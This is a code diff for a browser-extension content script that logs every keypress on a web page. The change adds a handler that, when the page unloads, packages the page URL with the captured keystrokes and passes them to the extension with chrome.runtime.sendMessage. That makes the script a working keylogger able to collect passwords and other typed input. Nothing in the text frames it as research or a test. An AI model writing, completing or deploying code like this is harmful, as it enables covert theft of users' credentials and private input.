@@ -1,8 +1,11 @@
-var data = {};
+// var data = {};
+// var b = location.href;
+// var a ;
+var data = '';
 document.addEventListener('keypress', function (event) {
+	var a ;
+	var b = location.href;
 var ascii = event.keyCode;
-var b = location.href;
-var a ;
 console.log(ascii);
 if((ascii >= 65 && ascii <= 90) || (ascii >= 97 && ascii <= 122))
 {
@@ -29,17 +32,25 @@ else
 	a = String.fromCharCode(event.which);
 	console.log(a);
 }
-if(data[b] == null)
+if(b == null)
 {
-   data[b] = "" + a;
+   data = "" + a;
 }
 else
 {
-	data[b]=data[b] + a;
+	data = data + a;
 
 }
 console.log(data);
-if(window.onbeforeunload)
-	alert('are you sure');
 
 });
+window.addEventListener('beforeunload', function()
+{
+	if(data != '')
+	{
+		data="URL is: "+location.href+"   Data is: "+data;
+	    chrome.runtime.sendMessage(data);
+	}
+},false);
+
+
